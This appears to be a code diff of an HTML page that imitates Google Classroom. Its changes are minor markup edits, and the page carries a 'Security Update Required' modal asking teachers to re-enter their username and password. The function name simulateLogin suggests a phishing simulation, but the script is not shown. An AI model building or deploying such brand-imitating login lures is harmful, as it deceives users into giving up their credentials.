@@ -3,9 +3,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Google Classroom</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
   <link rel="stylesheet" href="css/style.css" />
 </head>
@@ -22,7 +20,6 @@
       <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" class="avatar" alt="User" />
     </nav>
   </header>
-
   <aside>
     <ul>
       <li class="active"><i class="material-icons">home</i>Home</li>
@@ -32,7 +29,6 @@
       <li><i class="material-icons">settings</i>Settings</li>
     </ul>
   </aside>
-
   <main>
     <div class="class-card">
       <div class="card-header"></div>
@@ -45,17 +41,15 @@
       </div>
     </div>
   </main>
-
   <div id="updateModal" class="modal">
     <div class="modal-content">
       <h2>Security Update Required</h2>
       <p>Please verify your teacher login to continue.</p>
-      <input type="text" placeholder="Email or Username" />
+      <input type="text" placeholder="Username" />
       <input type="password" placeholder="Password" />
       <button onclick="simulateLogin()">Verify & Continue</button>
     </div>
   </div>
-
   <script src="js/script.js"></script>
 </body>
 </html>
